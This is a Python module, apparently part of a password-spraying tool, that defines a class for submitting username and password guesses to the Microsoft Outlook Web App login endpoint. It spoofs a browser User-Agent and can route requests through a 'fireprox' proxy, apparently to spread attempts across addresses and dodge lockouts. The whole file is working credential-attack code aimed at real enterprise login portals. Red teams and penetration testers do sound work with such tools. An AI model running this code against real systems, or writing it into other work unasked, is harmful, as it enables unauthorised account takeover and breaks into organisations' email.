import requests

from .classes.BaseHttpTarget import BaseHttpTarget


class Owa(BaseHttpTarget):
    """Password spray Microsoft Outlook Web Applications"""

    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout
        self.url = f"https://{host}:{port}/owa/auth.owa"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/owa/auth.owa"

        self.cookies = {"PBack": "0"}

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": f"https://{host}/owa/auth/logon.aspx?replaceCurrent=1",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        self.data = {
            "destination": f"https://{host}/owa/",
            "flags": "0",
            "forcedownlevel": "0",
            "trusted": "0",
            "username": "",
            "password": "",
            "isUtf8": "1",
        }

    """
        # proxy settings
        self.http_proxy  = "http://127.0.0.1:8080"
        self.https_proxy = "http://127.0.0.1:8080"
        self.ftp_proxy   = "http://127.0.0.1:8080"

        self.proxyDict = {
              #"http"  : self.http_proxy,
              #"https" : self.https_proxy,
              #"ftp"   : self.ftp_proxy
        }
    """

    def set_username(self, username):
        self.data["username"] = username
        self.username = username

    def set_password(self, password):
        self.data["password"] = password
        self.password = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url,
            headers=self.headers,
            cookies=self.cookies,
            data=self.data,
            timeout=self.timeout,
        )  # , verify=False, proxies=self.proxyDict)
        return response
